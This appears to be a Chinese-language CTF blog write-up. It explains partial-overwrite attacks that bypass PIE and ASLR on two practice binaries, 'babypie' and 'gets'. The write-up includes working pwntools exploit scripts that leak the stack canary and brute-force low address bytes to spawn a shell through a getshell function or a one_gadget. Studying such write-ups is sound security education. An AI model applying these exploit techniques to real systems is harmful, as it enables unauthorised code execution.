<!DOCTYPE html>
<html>
  <!-- Html Head Tag-->
  <head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content>
  <meta name="author" content="C0yo7e">
  <!-- Open Graph Data -->
  <meta property="og:title" content="partial overwrite">
  <meta property="og:description" content>
  <meta property="og:site_name" content="The lair of C0yo7e">
  <meta property="og:type" content="article">
  <meta property="og:image" content="http://yoursite.com">
  
    <link rel="alternate" href="/atom.xml" title="The lair of C0yo7e" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  

  <!-- Site Title -->
  <title>The lair of C0yo7e</title>

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="/css/bootstrap.min.css">
  <!-- Custom CSS -->
  
  <link rel="stylesheet" href="/css/style.light.css">

  <!-- Google Analytics -->
  

</head>

  <body>
    <!-- Page Header -->


<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="page-title with-background-image">
          <p class="title">partial overwrite</p>
          <p class="subtitle"></p>
        </div>
        <div class="site-menu with-background-image">
          <ul>
            
              <li>
                <a href="/">
                  
                  Home
                  
                </a>
              </li>
            
              <li>
                <a href="/archives">
                  
                  Archives
                  
                </a>
              </li>
            
              <li>
                <a href="https://github.com/<your-github-username>">
                  
                  Github
                  
                </a>
              </li>
            
              <li>
                <a href="mailto:<your-email-address>">
                  
                  Email
                  
                </a>
              </li>
            
          </ul>
        </div>
      </div>
    </div>
  </div>
</header>

<article>
  <div class="container typo">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="post-info text-muted">
          
            <!-- Author -->
            <span class="author info">By C0yo7e</span>
          
          <!-- Date -->
          <span class="date-time info">On
            <span class="date">2019-08-16</span>
            <span class="time">14:07:12</span>
          </span>
          
        </div>
        <!-- Tags -->
        
        <!-- Post Main Content -->
        <div class="post-content">
          <h2 id="partial-overwrite"><a href="#partial-overwrite" class="headerlink" title="partial overwrite"></a>partial overwrite</h2><p>我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。<br>（对于绕过PIE的操作我是没怎么接触过的）<br>大概就是用字节覆盖修改地址，使程序跳转到我们想用的函数上去</p>
<a id="more"></a>

<h1 id="Babypie"><a href="#Babypie" class="headerlink" title="Babypie"></a>Babypie</h1><p><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%871.png" alt><br>这是一道保护全开的题<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%872.png" alt></p>
<p>看到主程序，发现有两处写入</p>
<p>Read函数的最大问题大概就是它不会给末尾加’\0’所以可以leak地址<br>leak canary<br>在第一次 read 之后紧接着就有一个输出, 而 read 并不会给输入的末尾加上 \0, 这就给了我们 leak 栈上内容的机会。<br>为了第二次溢出能控制返回地址, 我们选择 leak canary. 可以计算出第一次 read 需要的长度为 0x30 - 0x8 + 1 （因为canary的低位是\x00截断符，先用\x01去覆盖这个低位，然后打印出来后面的7位，最后加上\x00即可）、</p>
<p><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%873.png" alt></p>
<p>发现有个可以直接getshell的函数，直接可以调用<br>我们用第一个输入点把canary爆出来，然后第二个调用可以直接getshell的函数</p>
<p>然后exp的话，因为开了PIE所以只能知道低三位的地址，第四位得靠爆（真的是随缘的那种）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">	try:</span><br><span class="line">		p = process(&apos;./babypie&apos;)</span><br><span class="line"></span><br><span class="line">		p.sendafter(&apos;:\n&apos;,&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">		p.recvuntil(&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">		canary = &apos;\0&apos; + p.recvn(7)</span><br><span class="line">		print &quot;canary:&quot; + hex(u64(canary))</span><br><span class="line">		p.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8) + canary + &apos;bbbbbbbb&apos; + &apos;\x3E\x0A&apos;)</span><br><span class="line"></span><br><span class="line">		p.interactive()</span><br><span class="line"></span><br><span class="line">	except EOFError:</span><br><span class="line">		p.close()</span><br><span class="line">		continue</span><br></pre></td></tr></table></figure>

<p>爆破了n遍之后终于。。。<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%874.png" alt></p>
<p>然后发现，直接覆盖低两位地址就好了嘛！（read和system的函数贼接近，前面都是一样的，真的是要哭了）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./babypie&apos;)</span><br><span class="line">p.sendafter(&apos;:\n&apos;,&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">p.recvuntil(&quot;a&quot;*(0x30-0x8+1))</span><br><span class="line">canary = &apos;\0&apos; + p.recvn(7)</span><br><span class="line">print &quot;canary:&quot; + hex(u64(canary))</span><br><span class="line">payload = &apos;&apos;</span><br><span class="line">payload += &apos;a&apos;* 0x28 + canary + &apos;aaaaaaaa&apos; + &apos;\x3E&apos;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>效果长这样<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%875.png" alt></p>
<h1 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h1><p>这题没开pie，但它选择覆盖那里我还是挺懵的，就是两个真实地址，<strong>libc_start_main+192 和 _dl_init+139<br><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%876.png" alt><br>我们到底选择覆盖哪个呢？这就很茫然了<br>Wiki上说的是：<br>我们一般要覆盖字节的话，至少要覆盖 1 个半字节才能够获取跳到 onegadget。然而，程序中读取的时候是 gets读取的，也就意味着字符串的末尾肯定会存在\x00。<br>而我们覆盖字节的时候必须覆盖整数倍个数，即至少会覆盖 3 个字节，而我们再来看看</strong>libc_start_main+240 的地址 0x7ffff7a2d830（我这里是800），如果覆盖 3 个字节，那么就是 0x7ffff700xxxx，已经小于了 libc 的基地址了，前面也没有刻意执行的代码位置。<br>一般来说 libc_start_main 在 libc 中的偏移不会差的太多，那么显然我们如果覆盖 __libc_start_main+240 ，显然是不可能的。<br>而 ld 的基地址呢？如果我们覆盖了栈上_dl_init+139，即为0x7ffff700xxxx。而观察上述的内存布局，我们可以发现libc位于 ld 的低地址方向，那么在随机化的时候，很有可能 libc 的第 3 个字节是为\x00 的。<br>举个例子，目前两者之间的偏移为<br>0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000<br>那么如果 ld 被加载到了 0x7ffff73ca000，则显然 libc 的起始地址就是0x7ffff7000000。<br>然后就理所当然选_dl_init了（我觉得可能是libc是程序开始的地方，离我们要覆盖到的地址有点远，所以选一个近一点的）</p>
<p>所以由上面调试的截图可以看出，我们输完0x18个字符下一个ret处就是libc的地址了，而init离它还有18个偏移(a8-18=90—&gt;8个字节为一个偏移）</p>
<p><img src="/2019/08/16/overwrite/%E5%9B%BE%E7%89%877.png" alt><br>然后我们找一个能用的onegadget<br>我们写个payload看看可不可以跑（估计要跑个六七万次，太难了啊）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">common_gadget = 0x40059B</span><br><span class="line">def exp():</span><br><span class="line">    for i in range(0x100000):</span><br><span class="line">        # if args[&apos;REMOTE&apos;]:</span><br><span class="line">        #     p = remote(ip, port)</span><br><span class="line">        # else:</span><br><span class="line">        #     p = process(&apos;./gets&apos;)</span><br><span class="line">        # # gdb.attach(p)</span><br><span class="line">        p = process(&apos;./gets&apos;)</span><br><span class="line">        try:</span><br><span class="line">            payload = 0x18 * &apos;a&apos; + p64(common_gadget)</span><br><span class="line">            for _ in range(2):</span><br><span class="line">                payload += &apos;a&apos; * 0x28 + p64(common_gadget)</span><br><span class="line">            payload += &apos;a&apos; * 0x28 + &apos;\x16\02&apos;</span><br><span class="line">            p.sendline(payload)</span><br><span class="line"></span><br><span class="line">            p.sendline(&apos;ls&apos;)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            print data</span><br><span class="line">            p.interactive()</span><br><span class="line">            p.close()</span><br><span class="line">        except Exception:</span><br><span class="line">            p.close()</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>之前偶然跑出来一次，然后再没跑出来了……先放个exp，改天再试试</p>

        </div>
      </div>
    </div>
  </div>
</article>



    <!-- Footer -->
<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <p class="copyright text-muted">
          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
        <p class="copyright text-muted">
          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
        </p>
      </div>
    </div>
  </div>
</footer>


    <!-- After Footer Scripts -->
<script src="/js/highlight.pack.js"></script>
<script>
  document.addEventListener("DOMContentLoaded", function(event) {
    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
    codeBlocks.forEach(function(block, index) {
      hljs.highlightBlock(block);
    });
  });
</script>

  </body>
</html>

